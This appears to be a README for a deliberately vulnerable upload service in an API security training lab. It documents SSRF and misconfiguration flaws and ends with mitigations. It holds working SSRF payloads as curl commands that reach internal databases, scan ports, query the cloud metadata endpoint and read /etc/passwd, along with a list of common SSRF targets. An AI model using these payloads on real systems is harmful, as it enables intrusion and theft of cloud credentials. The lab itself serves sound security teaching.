# Upload Service

The Upload Service demonstrates Server-Side Request Forgery (SSRF) vulnerabilities by allowing file uploads from URLs and internal network scanning.

## Endpoints

### File Upload
- `POST /upload/url` - Upload file from URL (VULNERABLE: SSRF)
- `POST /upload/scan` - Scan internal network (VULNERABLE: SSRF)

## Vulnerabilities

### API7: Server Side Request Forgery (SSRF)
- Can make requests to internal services
- Can scan internal network ports
- No URL validation or filtering
- Exposes internal network information

### API8: Security Misconfiguration
- Verbose error messages expose internal details
- No input validation
- Debug information in responses

## Security Issues to Test

1. **SSRF - Access internal services**:
\`\`\`bash
# Access internal database
curl -X POST http://localhost:5005/upload/url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://user-db:5432"}'

# Access other microservices
curl -X POST http://localhost:5005/upload/url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://user-service:5001/users"}'
\`\`\`

2. **Internal network scanning**:
\`\`\`bash
# Scan for open ports
curl -X POST http://localhost:5005/upload/scan \
  -H "Content-Type: application/json" \
  -d '{"target": "user-db", "port": 5432}'

# Scan localhost
curl -X POST http://localhost:5005/upload/scan \
  -H "Content-Type: application/json" \
  -d '{"target": "localhost", "port": 22}'
\`\`\`

3. **Access cloud metadata**:
\`\`\`bash
# AWS metadata (if running on AWS)
curl -X POST http://localhost:5005/upload/url \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
\`\`\`

4. **File system access**:
\`\`\`bash
# Try to access local files
curl -X POST http://localhost:5005/upload/url \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///etc/passwd"}'
\`\`\`

## Common SSRF Targets

- Internal databases: `http://user-db:5432`, `http://product-db:5432`
- Other microservices: `http://user-service:5001`, `http://product-service:5002`
- Admin interfaces: `http://localhost:3000`
- Cloud metadata: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP)
- Internal network: `http://192.168.1.1`, `http://10.0.0.1`

## Mitigation Strategies

To fix SSRF vulnerabilities:
1. Implement URL allowlisting
2. Validate and sanitize input URLs
3. Use network segmentation
4. Disable unnecessary URL schemes (file://, ftp://, etc.)
5. Implement request timeouts
6. Use a proxy for external requests
